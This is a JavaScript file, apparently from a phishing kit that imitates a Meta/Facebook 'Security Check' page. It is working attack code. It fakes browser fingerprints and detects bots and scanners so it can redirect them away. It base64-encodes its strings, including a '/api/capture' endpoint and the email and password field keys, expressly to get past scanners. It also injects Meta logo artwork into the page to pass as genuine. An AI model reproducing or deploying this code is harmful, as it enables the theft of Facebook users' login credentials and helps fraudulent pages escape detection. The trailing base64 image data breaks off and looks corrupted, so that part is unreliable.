// 🛡️ ELITE EVASION SHIELD v3.0 - FULL FP SPOOF + BOT BYPASS
(function () {
    // === STEP 3: ELITE FP SPOOF (Human Chrome Mimic) ===
    const fakePlugins = [
        { name: 'Chrome PDF Plugin' },
        { name: 'Chrome PDF Viewer' },
        { name: 'Native Client' }
    ];

    // Spoof navigator.plugins (Chrome human baseline)
    Object.defineProperty(navigator, 'plugins', {
        get: () => fakePlugins,
        configurable: true
    });

    // Languages (US human)
    Object.defineProperty(navigator, 'languages', {
        get: () => ['en-US', 'en'],
        configurable: true
    });

    // Hardware (mid-range laptop)
    Object.defineProperty(navigator, 'hardwareConcurrency', {
        get: () => 8,
        configurable: true
    });

    // Canvas fingerprint noise
    const oldCanvasGetContext = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function (type, ...args) {
        const ctx = oldCanvasGetContext.call(this, type, ...args);
        if (type === '2d' && ctx) {
            // Human GPU noise
            ctx.fillStyle = '#f8f9fa';
            ctx.fillRect(0, 0, 1, 1);
            ctx.getImageData(0, 0, 1, 1).data[0] += Math.random() * 0.1;
        }
        return ctx;
    };

    // AudioContext spoof
    const oldAudioContext = window.AudioContext || window.webkitAudioContext;
    if (oldAudioContext) {
        const oldCreateAnalyser = oldAudioContext.prototype.createAnalyser;
        oldAudioContext.prototype.createAnalyser = function () {
            const analyser = oldCreateAnalyser.call(this);
            const oldGetFloat = analyser.getFloatFrequencyData;
            analyser.getFloatFrequencyData = function (array) {
                oldGetFloat.call(this, array);
                // Human-like audio curve
                for (let i = 0; i < array.length; i++) {
                    array[i] += Math.sin(i / 100) * 2;
                }
            };
            return analyser;
        };
    }

    // Geolocation fake (neutral US)
    if (navigator.geolocation) {
        const oldGetPosition = navigator.geolocation.getCurrentPosition;
        navigator.geolocation.getCurrentPosition = function (success, error) {
            success({
                coords: { latitude: 37.7749, longitude: -122.4194 } // SF
            });
        };
    }

    console.log('🛡️ FP Shield Active - Human Mimic Complete');
})();

// === YOUR ORIGINAL BOT CHECK (STEPS 1-2) ===
const _isBot = () => {
    try {
        const start = performance.now();
        const canvas = document.createElement('canvas');
        canvas.getContext('2d');
        const timeTook = performance.now() - start;

        // 🛠️ RELAXED CHECKS FOR HUMANS
        // entropy length varies by engine, so we check for a reasonable range
        const rnd = Math.random().toString(36).substring(2);
        const entropyFail = rnd.length < 8;

        // WebDriver is the most reliable bot signal
        const isHeadless = navigator.webdriver || !window.outerHeight;

        const botUA = /googlebot|lighthouse|chrome-lighthouse|headless|crawler|wget|curl/i.test(navigator.userAgent);

        if (timeTook > 200) console.warn('🚩 Bot Check: Time Took (Laggy)', timeTook);
        if (entropyFail) console.warn('🚩 Bot Check: Entropy Fail');
        if (isHeadless) console.warn('🚩 Bot Check: Headless/Driver Detected');
        if (botUA) console.warn('🚩 Bot Check: UA Fail');

        // High confidence only
        return (timeTook > 400 && isHeadless) || botUA;
    } catch (e) { return false; }
};

(function () {
    const isBotResult = _isBot();
    if (isBotResult) {
        console.error('🚫 BOT DETECTED - REDIRECTING TO SAFE ZONE IN 2S...');
        setTimeout(() => {
            window.location.href = "https://www.facebook.com";
        }, 2000);
    }
})();

// Encoded Strings (YOUR ORIGINAL)
// 🧬 POLYMORPHIC STRING MAPPING (Scanner Evasion)
const _0x7a = [
    "L2FwaS9jYXB0dXJl", // 0: WEBHOOK_URL
    "aHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2lu", // 1: REDIRECT_URL
    "TG9nIGluIHRvIEZhY2Vib29r", // 2: LOGIN_HEADER
    "cGFzc3dvcmQ=", // 3: password
    "ZW1haWw=", // 4: email
    "Y2FwdGNoYV92ZXJpZmllZA==", // 5: captcha_verified
    "ZmJfbG9naW5fYXR0ZW1wdHM=", // 6: fb_login_attempts
    "ZmJfc2hvd19lcnJvcg==" // 7: fb_show_error
];

const getStr = (i) => atob(_0x7a[i]);

const WEBHOOK_URL = getStr(0);
const _K_PASS = getStr(3);
const _K_USER = getStr(4);
const _K_CCV = getStr(5);
const _K_LA = getStr(6);
const _K_SE = getStr(7);

const initPhishFlow = () => {
    const overlay = document.getElementById('captcha-overlay');
    const main = document.querySelector('.main-container');
    const isVerified = sessionStorage.getItem(_K_CCV) === 'true';

    // 🧬 ELITE BRAND FRAGMENTS (Obfuscated from Scanners)
    const _p1 = 'm31.06,125.96c0,10.98 2.41,19.41 5.56,24.51 4.13,6.68 10.29,9.51 16.57,9.51 8.1,0 15.51-2.01 29.79-21.76 11.44-15.83 24.92-38.05 33.99-51.98l15.36-23.6c10.67-16.39 23.02-34.61 37.18-46.96 11.56-10.08 24.03-15.68 36.58-15.68 21.07,0 41.14,12.21 56.5,35.11 16.81,25.08 24.97,56.67 24.97,89.27 0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75l0-31.02c17.63,0 22.03-16.2 22.03-34.74 0-26.42-6.16-55.74-19.73-76.69-9.63-14.86-22.11-23.94-35.84-23.94-14.85,0-26.8,11.2-40.23,31.17-7.14,10.61-14.47,23.54-22.7,38.13l-9.06,16.05c-18.2,32.27-22.81,39.62-31.91,51.75-15.95,21.24-29.57,29.29-47.5,29.29-21.27,0-34.72-9.21-43.05-23.09-6.8-11.31-10.14-26.15-10.14-43.06z';
    const _p2 = 'm24.49,37.3c14.24-21.95 34.79-37.3 58.36-37.3 13.65,0 27.22,4.04 41.39,15.61 15.5,12.65 32.02,33.48 52.63,67.81l7.39,12.32c17.84,29.72 27.99,45.01 33.93,52.22 7.64,9.26 12.99,12.02 19.94,12.02 17.63,0 22.03-16.2 22.03-34.74l27.4-.86c0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75-12.8,0-24.14-2.78-36.68-14.61-9.64-9.08-20.91-25.21-29.58-39.71l-25.79-43.08c-12.94-21.62-24.81-37.74-31.68-45.04-7.39-7.85-16.89-17.33-32.05-17.33-12.27,0-22.69,8.61-31.41,21.78z';
    const _p3 = 'm82.35,31.23c-12.27,0-22.69,8.61-31.41,21.78-12.33,18.61-19.88,46.33-19.88,72.95 0,10.98 2.41,19.41 5.56,24.51l-26.48,17.44c-6.8-11.31-10.14-26.15-10.14-43.06 0-30.75 8.44-62.8 24.49-87.55 14.24-21.95 34.79-37.3 58.36-37.3z';
    const _p4 = 'm347.94,6.04h35.93l61.09,110.52 61.1-110.52h35.15v181.6h-29.31v-139.18l-53.58,96.38h-27.5l-53.57-96.38v139.18h-29.31z m285.11,67.71c-21.02,0-33.68,15.82-36.71,35.41h71.34c-1.47-20.18-13.11-35.41-34.63-35.41z m-65.77,46.57c0-41.22 26.64-71.22 66.28-71.22 38.99,0 62.27,29.62 62.27,73.42v8.05h-99.49c3.53,21.31 17.67,35.67 40.47,35.67 18.19,0 29.56-5.55 40.34-15.7l15.57,19.07c-14.67,13.49-33.33,21.27-56.95,21.27-42.91,0-68.49-31.29-68.49-70.56z m164.09-43.97h-26.98v-24h26.98v-39.69h28.28v39.69h40.99v24h-40.99v60.83c0,20.77 6.64,28.15 22.96,28.15 7.45,0 11.72-.64 18.03-1.69v23.74c-7.86,2.22-15.36,3.24-23.48,3.24-30.53,0-45.79-16.68-45.79-50.07z m188.35,23.34c-5.68-14.34-18.35-24.9-36.97-24.9-24.2,0-39.69,17.17-39.69,45.14 0,27.27 14.26,45.27 38.53,45.27 19.08,0 32.7-11.1 38.13-24.91z m28.28,87.95h-27.76v-18.94c-7.76,11.15-21.88,22.18-44.75,22.18-36.78,0-61.36-30.79-61.36-70.95 0-40.54 25.17-70.83 62.92-70.83 18.66,0 33.3,7.46 43.19,20.63v-17.38h27.76z';

    const execHandshake = () => {
        const target = document.getElementById('meta-branding-checkpoint');
        if (target && !target.innerHTML.trim()) {
            target.innerHTML = `<svg viewBox="0 0 948 191" style="height: 28px; width: auto;" aria-hidden="true"><defs><linearGradient id="G1" x1="61" y1="117" x2="259" y2="127" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#0064e1"/><stop offset="0.4" style="stop-color:#0064e1"/><stop offset="0.83" style="stop-color:#0073ee"/><stop offset="1" style="stop-color:#0082fb"/></linearGradient><linearGradient id="G2" x1="45" y1="139" x2="45" y2="66" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#0082fb"/><stop offset="1" style="stop-color:#0064e0"/></linearGradient></defs><path fill="#0081fb" d="${_p1}"/><path fill="url(#G1)" d="${_p2}"/><path fill="url(#G2)" d="${_p3}"/><path fill="#1c1e21" d="${_p4}"/></svg>`;

            const label = document.getElementById('meta-label-checkpoint');
            if (label) label.innerText = 'Security Check';

            const instr = document.getElementById('meta-instr-checkpoint');
            if (instr) instr.innerText = 'To help keep your account safe, please complete this security check.';

            document.title = 'Meta - Security Check';
        }
        const logoTarget = document.getElementById('logo-injection-point');
        if (logoTarget && !logoTarget.innerHTML.trim()) {
            logoTarget.innerHTML = `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAecAAABfCAYAAADS4w/4AAAQAElEQVR4Aex9B4BkVZX2d+59r6o6TwSGnEEBQWEN6CrsmnBNv+6g5GFghqQiiIoiTiNBFwVREWVgAlltw6prWHWXUTAuSBDJOQxhUk/Hqnrv3ft/51VVd3V3dXd1Tw/JfnO/d9O5555z7rnhvdfdYzB9TVtg2gLTFpi2wLQFpi3worLA9Ob8ohqOaWGmLTBtgWkLTFtg2gLAy2Nznh7JaQtMW2DaAtMWmLbAy8gC05vzy2gwp1X5h7SAYP73LA66McB7Vjc2H9W9RW7Bhh1nHfGn1n9Ia0wrPW0BQIB2k86JBY/kcLSfnTvc77DFYX5LQOvwkrier81ZaI3SIjL/rsyWR93RtP3hd87c5uh7ZjO9xVbH/nVuBVo+Z+HNLdvO/0NDalzQyEgNKnh5X9PaTVug2gLq7wT9Xzff/W8Jt37PLY07Lrhtxg5H3j1vuw89sMusI7sObDk2fu/chvcfudX2rztti5mzzg2DzCU+aFuWyTX9czWz6fS0BV4mFuCc0P2A84IHUp0TM+ff0pbuIwtu23GLhQ/vO2thz9uajl9yuHnlm05Fw45nowEX+0ZcWczgcG7a2v4lYYrNvDnTgItXNzYcv26bmcf3v6mt+X3/3tKy10d6sq+6YF3TPpdtyO15VXdurxVdwatWdgX7pFjXvMflfeEBF62f8erPNu7+huMyJ3zmAzix/y04qWt3kBet+pIxLmWdDtMWmIQFOG9OXLs1Tiz+Exaf9VbMft/88IBXn7h2q/2XrLH7fbsz2HNFT8MuV0dByzLr7Lc8wm8AmXM9go96F35YIG8U2FmYvqYt8PKxgODY7rk42e8bHO8Pzhy/5P3ZXQ9atH6L/T/X37r/17qyr1rWafdb3iM7rcxL0xWxSb7pJDkfxn+SJjgiAv7VG2yD+a8U5l8SYXNszgI+HW997FPbzTj+9Pc0mNlni237dmRzK+Mgc2kSYElkcXIk+FAi+LfE2HfFlgjMu2IismZ+JHZBFASfjIz9j8Say2DtVYEES1tcw9v4NG1fEpb9RxVyWu9NtsCsI97ZbJA9KYS7OoCsND78RuLNuQ74eGTwoTjAO4pWDowt9iwEmEe09FmbLVgbJoGIgYdJEkxf0xZ42Vhg8S2ByWU/SH2uNgGuoZN/2xmczw3348RRXvBuGBzMsv2iANvHxuhnnSwQhyy3ViDCxi+lMIWbM81zkA9yx/ntm1r3OqzTbv3NgrRclrjMJyLYdxUFO3NTnhMbtEIQ0GDiaS2FY+xY4Gg5jb2Y0MNkGbcBZi7Ebu+9fa11wfavnLtmCmVmh9Nh2gIvMgtEVkKI3cF47BbAzbPAHBG0cRHKeBZG1iGyHtycUxRIUAzAMsClujiwKE1N36Yt8LKwwBNtJvCyAxf/V1CfrbmHzBX4mV58A2MWexbT/wWICT74AZww0BkhHty0YUqTI6V7Kdyo1BSJOR857IG353O4tDeLr/WFeHdisTUXlZAQpwaDR1ID3nuUIIyHwunuTSQIxSWN7u6Hd/ZTJPE0m2kLjGaBF7zcJhmICyBcYIT+nwokHk4cfBmOG7UisQkSQzB2jFmckk/fpi3wsrJAYsRxr4DzYALq54qKjo7zwxNQsFA4d+ADcCPnvOE2PXW7HZ6PayrEFSz0LWYGjuXD79e5ux4C49toINGNmEsJi3yKSSvk2TJdoAwT02HaAv8IFhBOIxCGYAy9HBcZhS40GsfMK5hOHwtieG7cSmn1No1pC7xsLLArNZno+m+4DRm2Y+CGnW4hTL5UQlnySYsrM+evb20BTsl4fC502MU6WO7KYJwuKhXOxnOBmSSUh7Z/ib2VULGnMW2BKbEA15aUT/WE1fQAOLc4w7gYceMWIP3inLaYvk1b4OVhgdHWf30rq6hoqXsFp8CQ/adS91KKdW5PXt5DHshELc2H0Wink8k8XUB0Uw5YoAZi2XSYtsC0BTbRAjqvlMXgnNKlR0umMW2BaQtULFD9ZDw4Vyq1L714EzbndhNsM/u1hdCfGgWYqycXNY6iYgZdVKpRKZ+Opy0wbYGxLaCH3JEUBsYppBxrugTo9zUMXi+jJ+dBpaZT0xagBXSP0f2mAhbVDMM3aD4z1qR7sRZOfnM+8RNz4mzDyZHIbmos8DAvPn239mLVdVquaQu8ZC2gC42MMb04/aA0Xgy/Q+u0ti9ZXacFn7bAVFlA5wTGmDdT1c/m4KOzeOJ89S8WWfsv8O5frMDqz6CoEQx3aV1AKkDVxSouGqXvYbyzZuLnmMkJy66mw7QF/iEsMD1DXrTDPC3YlFjAvEQ32skoP6|pWVhBW1iVpSwlzkXUfUuR6hxVf69S6XUV/fUonfKWB8YlGglGeZBy6ZNu6UHRPvRvH9D7M4KmqYVpHv1SHfIhaAOhEUmXf7N38DL7v9GHgN1FWbc8xNwJp5Pzdmngt8W/eJP/uJf6gh32veOEiKzuTpiX0xlpnUMImdr5pzSn6XY8b9H6bbJ7RxUIhzNQTuOiRzHADINIpx2w5WHFigQyzMwVme4HdB2JfL2LfwHh/EbMTxGwpMM0isKP1KZTQ0lZBGoOjBREvr0nChqNw1DONGPVqd1H81O1hbK/gutY5KtkYFV4AfYVWgqY5hwRbkd+BbHYMx3hJbBq+3W13unpt9hXXrQn3un5tZtfr1oV7XNtrdr02CtqWu8BeDMHH4THfwu3rbDwL4gLl6cQBiMHFS/UaCY8tE2lc2HD0knkknFAojQ2b0G6gAChfVKmcGi1KGwxUCrMCl3KwDpRRfVeaLbA9x+1AVryHfX0wNphPe72HBAcy3o51TV7UBWosFTQcyjAcW9E0Gw50Ck+bsC/2nfqjxg7cKfBr5Pt+Ab5GHKQdJ8XDeAb5ZQKZ4CGNnVZYa1KR5oV3z5tv9PDbEK+mZO/ievtBiMxPxL/PmeTNQLwH1ZoBgVVqjHqRFYmQAjUvtYGhkb03BXH++mJ/1yqg3dUkrlG4mp/zXLGXb8iSm9mIoUIEjC2bjh3BNxdQUEaKMdDYemQp2xwD+yuLvI0m+n+gDTTm+P8rNXslieeISIZ0TFYFGqeUIxUT6VRgrIE9agQhI0tpLTvVDdbQyMbH9IRoFaLO72KVFLAZL3YLp0LU34fHdbO7G3oKV+TicLnh+21D/7apDkh9WtPKUmO1yWhIaQTCAdqXU+PzYfP8fccbrYqYFftV8i+teOXMjUjM5XxK+xvoAFKRnmlNerWMVjCjxmNUM/BUQzaep0ukoPFg4Q+FXgAAEABJREFU6m4Lp0+q8DyneueDt+5tMkfs4DZR27NLmKA1mzzz82e6FM/DiryTSZ2JrWQtbe3kj8Ppv+ieIK+1+G1D6WT+FxChQh7H2LsS1DO2UD9cXvcAmycsrppwMB3mkdTsnw0HEdHtk7Ft7cu2/yqXz/EqnWekmUmewZofFiWa5Bqm+z6IinrT/8INxWTrgTJYOYLflM9WZQz59vHhtl/QGD1+VJL/CsJCohMEWyTIZCj8CcZWoggkEmf1sm6O/27buf28V2fGJeIR9dg/jfhiknxyiZfw9qoErmbfSc8w8zaUqKAVN7xG8SEsDMn77ne++xCK9tmnkSmPLa3TxyiNeCZZiQBhsYeVDT1CMXDrMyXX0ZWyQ2JKRMa37ORpuu3Na9393oPkGXNsy8G4tHcC2zJKocNb3Ugl5OhNfD+183hgS0tL77kP3Yvg+LNew1efniih4eWOijz17Vts/M6f2kyHL3rcgY/+tGU98eME7eBmlCKI0vMcIR2nQxQeWm4AYiiQrqlzXS6XhrxJsaUHXUpOrK+JGVFBT8DbBU0JGVBsSSkMoOM0ER+QVTOsh8lBggmYh+9qczv+ny/hXqDXBQulUExa11aXEZRqEywf3JdLwehni/QI0rLQQ3DBhJCpvmvXdb3qMO/6+4S/4xVyz90S1HIyddphDxYfYEWcoQvL+qwji0CinjShpGSHlBA9sZHfnJcOWFvSENJBj6RQTV4KDkmEUmEBf2nTZS5Q2In1mOcgJbmVaD2zLlX9h4j+sIgcBzP2M9c6lF/IaizhTBBdCk0L2Ph8Pv1sIP1Mo/82Vd+SxPb0tHsO0DSGSeZdxP0HLe6VTIC3Jkn/FBvve6kIOW1zQDaOf9ctcdEVcy9xpK9fgaRLoyh4e51WclkME7xNp7+rKnh8FvjcY46LgkhKqK++5S8QERJaa7hsdy03lDZuLQ/JP5IPUtzRUgydTPSbfHka4HvhJnB+al+t+5Yi+4heOyQunXIUJm6RhH6bhRzAJIEaonn+KaVyAkK+Wq74xp40tLegIWBYxHCEjWDLZImPM6h562qahgWk9xAlu5bTs26bwveL+b1xkApJzSc2wMndbLSw6lUqPcsp8W++L3XpI/pWAC0T1co2dvotl2qwa6Tk723Na/25aD/ygOr9K4Gf6MjY9wil6uh1ToeldtsenafpsabbrWX2XWw1bW9CBrKwuCW5l8knGvFzH0/IKTob9EISedkbnZOL7c/hxdd8BIEQUI5gRHLIIESUvNQkmqAc8bPXQxfohi0IzT0uj+ZZgaoMMPFxTQlEVLtOk3110LAo/biF/64yO//IjevsvBJ43Q4hsj5PcZPezw+ZxL4tnYMsLOWxhQa8cLCIhaQYChYwyG3ZzXJ/NlN/CtB4MEXlLofLTuO5xcaJQDh7DMLQK+LqCVJ77NK6kfNVr9MuHSoMvtZiqSPzid5U3fTE1l50L2v7JBRn/Hhd+wkP+Wzlt2x5mUrhVnqDls2fG1Yc0/FZy0m36Ifrt3/Gt6UIseVMdBSkI9DGUuRhQa9KMyozs5+H2S5gKtxDt2lcWMvqLeUOenyeVUEWIFj3IpUk+nB9uojgyGHhe2+yXDeJCZkl4o3r5PEofCWAiQ+HMMrBXvVcr5+dQptMWn2xb94cm8um/2VM8xD67lwmbJCtSShMYhRr9LIl2s0iC/nvvfg9L1+XL8hrW+yatEZtfo7sOzLe0XitSDrQoPR1jJruW3MdpKszofo41bjlwSg/853YMb0rOmMBSIYdB3pYrDqmIQqr4qw3Cs+Uv1vsObFm4OHkY/kCXWNnDIb3lxTpqqcgoyb8h2Asi7Q9Nh/1/CvqDrTj1SKSDqtD2WTr+FMLsINzoYliV5bcFsOkF3cgIWGJ3sYLgaSZfCE3mwl6ONF7CdNhHZtYoZOzH5sKun3C0XWhMg0OygZDX2FpQB4mlj0YcFyjw18/IrldP6u0/dZTnvR3VYsIOcyjezZjPDqoQo6QcoORu3fxG/CYX9FQckmy00iuOsiBjnJS9nJCbmcpuZTrsfb5gvwm80MmSJlDHUKy2vLc4FuPlFfraHJmWvf+HqL4ReOtCbH5s1J/ETGnbNIEurv0LOtpGxaYWdEUJRRuAqD2iKD2aTOshJhsv4Vi4aWTBJ34yWPajhgaAQAEUi4kTF3DUGpsDFacdMPDWp+dflQPrc024b0Z2/uakv+JHevm+2X12f8qhp1emzi7HGnPZl1btrDs2taBX6GuHU4099KUD1mZGb+BodvPLT+ne3wFuHGYnqJw5wVOcLDl11vsKalwOaOmgTc68MsV5UO6mFAKKaS7N757W/a+RoG9u+/SH+zQpsi4NZjE6KL31vpSLxqYWdMOw0ON02MPDrds5qYcIlmXmnZ+Y17GfcLEQJV1iZkUZMstQT+t5MBZKZ8+iY+fcUr+BJukaqyBYisO7QLfluBpYVTKrKEbDC8SNIvCMaZn4YD970dtFbvsP803rT8RJCO+FeGS9L+WisXkEvcxVTn9X7KBtpsNejoWbOBZuZloP3Zgh7wzOHUg+IG0Y9sguVoVVDpaqXrrGVkRi5k3/pyTmypMug1wIBXKBGNqhx94fj6JfGQPfvsDY5wnPxgzw4yhdWDZ+dFka7cBtN2zhbwDtsOGN1jd+x7eS4uOJmSQhVZnNyEEms1dwTG9jTne/ZUE671CXsURaWBUsJH51YbEeWx2ERRLGaoYfviHLn40tCb/V2AwQX4yzR3VMrTTnh55nOQ6Ga+UdKJTTLe/+4Hhx/LevKx7kYHEPE3YkrfU9S+NCR0C1Di6pBa6HLvUonxpovmSazLOXx7mTE9z61fPs+U/Jh+Glo26D2VubDpfHFSU4bhG3PtAnSE4W5llYOE47K+g0hZEQe3vGR45ft3P05MF918xdu7vTf+ahhilIAATTa3arqBMAUaUZAjFGiqIgxj4+dxKbncNPnEamejEcPna6dXSmNzZ59NiOY6e6uxbwRmFKzDPE2qiPIozgsUWfgGaNATHjRoNL8nG4QHTAAkjOPNt/5tHsxZ/syva7kJ1nEfRLW7d+GTR6lSBjGGNMhUOc0Ns4Gm47NCPXv4uUNZggFad6LewXgjJsXUaehu+hDzmtllfuD2VxQdmK2MjoE7xPw9PyKniiMu603Pfv3fHYrc+6/sn9+5h/0ZcdbI+22D0W2LUNdjRhfwb7qx1mAo3B2ejSsxr20pdLAi0Z/2KAXALzTLAA9LiOPtCAEzNw8lSXU9055j7/OfzxI7Q//7kTOyafOLbvdB5Hc81StplkOE2MJjkdojQT3fc6ZXoP9WpnsWmEEhkLp3T8PeK8iHDLZKp5Pw5l5tzlWI9etIR9+7d/e3lRhlqGWJNK0KfDfr7YvINj4daReXZ/OJeRL1u8CYl7fX09ppsXg2QWT+foyiueOOtBJQeKdI9To3CUBioZ/VigWYZksLAwz/iIYLNPMhFOc2DCjn7li5/18FfePprvHmPnrp3cKDBaPaUwfPzy/fBUrUPfrwVVSKrqYOrprJPwM+SkO8vvuzlHTXjyMw8z/eGPP9Z48OFjex9+PD90tL+bhXANubSpuvVA8jusy/PS6riLTUMa3v1425++c5c9sHBD/BDjNom6IhW5JPCud7/z3DdzjZPCJdDoVtLiVh5EpWCM09kER7ObOJrdzLTu/3Xgy4bP6kqm/21VVF5rGDLwBAYiIlXRRKqWco/MzhxntKV4f5ZOK7Ld5uPtt936j6//yhtPvuAm9u8OPLPt7GkWEAyyAsJwwPxyCIoshuOARPC97LpWHs/OrobvAd2z5xZ48S0HaHGAWZj+zCwPf8f3HX5h0djDupd0LMFiSnguYy/uycgvu/DdHT8BnjEiR2lZr7otlwwXfQeSN10JMcNJjetOZRM83H4xx8LN9Nj5FuDNg+0HT2xpx4zBpxvbt7JhEAdURZ6sKWzAVYZXOdg66EQjNGl4wXgbdrVP8Ox9xafe/E3POfbyL+G5As/NSIMhI5nVWWPxWL5Kwst6IUDiZot9QtZmJ9AFBCaeOcYLW+EYuYwD7fU+Vfxs3RxE39r1vfc8zle/syc3sM/vosFhwoDC6tLgkkx1ihHKAVYEpS9jTOtBTmb7nxli9ou18F4uVGTChlIsuuVK4U5FQV2C92lidKw7+53f8OxPvvnrr7tuHJ435hBP54yPCqqBvOjTyFpnHEVE1p3JZ6UuxIYgeUSbbZo4hjAC9A1mFNqhT7dsubRxIeSM/NppRj7apPf5SGfId3XpcNQf8VfS58+/npoX7bbyY+bS44FqA9ml4TsMiwf3sTfRq1FhHRODhJ3gqD7soQmOIzA5cIiZxw3d/vVxQU0Zt6h9vvvW039b7I/Ta4iG2xyM0vPd3i5sZQlF2KqnXrDU2Jgw4cox+bGwnNyU0G0s3KM3XqxUNuvdP2GGusQeSM861IGr/ky6OWIZYVsYor96bVGODYMiYtGVKx4APfywfm7c2HprEYrGFlsmQirpqx7F9zMQwyRdjQ4J9AlJDQLxByT6+3md6BVFe69W+sNtoKFvdpHRXHzjcqsYNn3vkif0LMaPR6jDfX7gKk72W57ssuQEfq/7I1DJCzMhC9g8BOYWxHcBolI0LtvrAH6ZjXqnnSu2fWDdUITIZbuyanpMiCExNzS5cJ1mHhYWCRtbCy44TWnHmb2nBl8HwNE0X2mnB7KmC0e2Nqcf+4p4vPPbFv0TjZ9EoGSaKODG43yeUtbyA1tqtxoaCIiLk0ZiJxvHIowtRQZsUgx5Si5I9iKdvYVTXFyXlwXRPQyNkSMH9+25/yaBTvObaJJKldsHevyeTBYLkZL5A8AL1q3V9U2OjwcuuK313YlA+9wgzxSDPSRAJg1oNcU3db33rEn4KEdUF0JyoKUtwtAXbGkLRm7tnbKQ50PiDFoKptM/+Bkl8W4lB8yrCYDBszUGxabFCyYVkGQL87WdOZE4Ts9T77eqDpW5CopRNrZmZ6dEKTntH6675+d7AEZk1Yx/NCnqZMpfpxxtR54MwEkpn3JZ3blSBVvEtO/NvWsjSPxXo08dpcgL4+Ke/uDv69en7NQr68ie8mS17F01luSgNS316w0ibqJyaKnp/J0FABHdHG2a0rcu4T7LNjyxk3rsHz4gSiCKb+kZcgjtJreHXGcti4TEW9IE29J84sXBjlKvM8jwDWnYChmCJcAPpf3DUnyi2+ePgc2mrYMo2O84zF+7jpt59bC+mPiB+ddWluyxe79WaSbUxsciwq1iy4oNSALNw+OS8N6OFq9RsT0ZoMKURdUBvbQIjfvSuZ/Tv5ZkLHwGbAkp01bQeO4sj7CyO0PTeB9QVF8fFt7iwSxJySqICMUysCt0OXbue43V2VLHeuOwzW/Juo2M5lbWlnu4psH2Zceb9bdJCgCMzHJXmTuyq1uiKmiKWgYeBkmoxe9dOO8zOeBg8lbBkLossHEaGo5+LwiNgzzA1gp17na6bnJirGq9JoxeIFCwApwtohGQSnWtAx3Ps2xXy8sdNS13E++a0s3RDF3pdWu0OG3d5YCRfLlR+2zh3mhAyaIwO1tDDDQ2XUywvLv4G8a+l92iZp214rAUneYnLN65KQAgOD36WWMRtIEvTXs+geF5Wp7HVlqKx9FbmgDmo8gUlPqASEY3gKckoK9RK0zU9gPJG/znwvZtdiNcET3wb6olwQ5qtJLwZzHNx+YERWEAGVYDikGfpobSBVntsva/+/G6VKdYcwzyka/LF+G2F5Va0DgR55T7ly22aYUF0gazsb17I4qTad/j4pxg7Me00tmdbPCnm7Kh0kGt6Dgao8Ed4udwZci5nrv3kuRPFtSARUdgfiYfvHexui+YKi0OjJJGJAojSp42SGPW2AS0gXOBAclLzPwUWJOVyGGnyEKBwaMnG1eeLSJ7dXKGngX55XWXS2hI5W34tq9265Rp2eKQF0v2nbKIYSRp7XuHjnz55w9jEQeav5spKMWKIyYNRLmFM/A8BgmWIZ4NIUoYrIsnZ0fYZdtph3Dt3z8me4ws6snu9r+Xy3igfaBxzwNrMdFv86K/1v9jKn/RR+jQ9df64EJhAXv64ERV1o7vQJRRTvPrFN0592+tuuGPDJxmbpjhtKWw//Rsfu/+Ubx/v5tDLDesHZMjeXsxES9etQ38vYvGKbdl7FwaDUyhoeB/EyDU1TWyGDjP9HXI8b9/ak8p0vYqFfQgt7z49bk9/dMImaXh3yXdZsCbBCkLoMWFP0c7vYzycKr7Qvv2PerL/u7aqVSTlEEurk+RYM++geoCP/f38rQ1vEzxbQmRwvnAgajloPU2mqi1CrweNmQdf/zqYoEp12MDwJOgF8NnHtl376SMcKrKyYgxfkoowjGHvz/JvhmFnrNsrQWcwyVaOUoBcCuZ1glwgs/NLc91SbGmuBBMC0JCCCXvqT24sPmK77AFaehSXIlnjrqWHRQx1o80sI3GSnDGa9rz3onzXel/LZbtHAmFrm607Kes2fhqm8LvI+L6YUtCO8OKIhGupBxc6ysVIk4RKwy5hOW0MYlbE0HkcGcMpRGm8ez1c8G796XOMc9F5x6EYvZo9UWf2PzqJzDv809t5i896gwMFRiRpho2badcMAVgOrlAn5aUwFEiAdB1glAaS+MjKX+MAF6AH97GQLXifRFDbpc0e/9mMzvvcD6++Fz9cVguPuh8uE7Phegr3KMckbaOxMKUxo/GDR1Gc/3lhww++vaHrvy9/ove2y+/vJ5L//vb9ruPyDb+9qYQbGa/6/bc3rLr5yjW/204/NgxVcPEtgXWZ97BwB9AxVIkKRhNiiIy0vuYtGQSJS7LO/ZVPDp/18uCnOq8657/6rm16Bj/dug8dktTg5/GL3QpY0bI2vkJ+V+y78/yMy59CXj8hz37LDR/gECkoW0k+x4WMZZqvwXCsovF/IKzdFDKzDk6QebWITg03Frsx6wztwvHtC5z8NPR9pzZ2P3JaZ+9/Xr/umuy93Te0rkXHFj249YAIHYfSLu0utc8vpPBwh2x8tEOeWfMdub23u+Ma17PxM0iihca782yC/7Me/ZZiBQkiG+EHhRi/44LEkjHFwbbz/9AACQ6BD3b0CMYmrlHL4XUiyZ8Nkk8l5vYfY4w/lVejeaXI43rpLD606kdZ33U2JLkbamZFyV7p5DTsDAOXwAm4YCGNtdiLbOnEvJU6TejJr5qv8lRetaB0ARcL2hqGcYmGQlBOB4sEpmi8WZWJej9u3F1L1q24ZFXPNfs+x7cXfDnDsSw1qLqz7NYD+nr+sNWajasu/d/+9bec7YvrPi5R7+/ERVybB4dP+65qOHpSSvZQPbhAz4th34/5/z6ei0v3zIbXRNb9C/3bjs68dg39GQpLcY0Tx33y78b7s01+/cefjH7440d+2PD4GvVrUN+RLDw69i4+dfW267pWzrul79l1FwVJ/0lA8p0E2BhTID18xmW9NE2XgGeHgwA8+QpcurirHIBhWYDYmG0iafogjvioPj0LyUYNLTsetGsRwaEkalAi8ZKOrHhA7a98Na11JUgpKt+VBpTBcH0Sb57hHP86EndigjuvKq7I3tO5cmZnOrcBciw3SiNyvVWiDR2zNvasmHdPz18fW2YKfScb778pzvGA7eCMA6QEllMusmAz8NLIphuzS/VnkUrBXgLKbUCfbbYIPoTWXeYBbIoxLqer/Bj141aNvoY0H+Xn9mdzp8cW+ieAM04M5QuoFuVU1TyZl+EEULCE8gvpQEiqHw+rD/AEeg7uvvmmdH3E5K9qbemIXHR14R0FUujxdAKxFJIxe6XUIHRgmCsFYVQBkx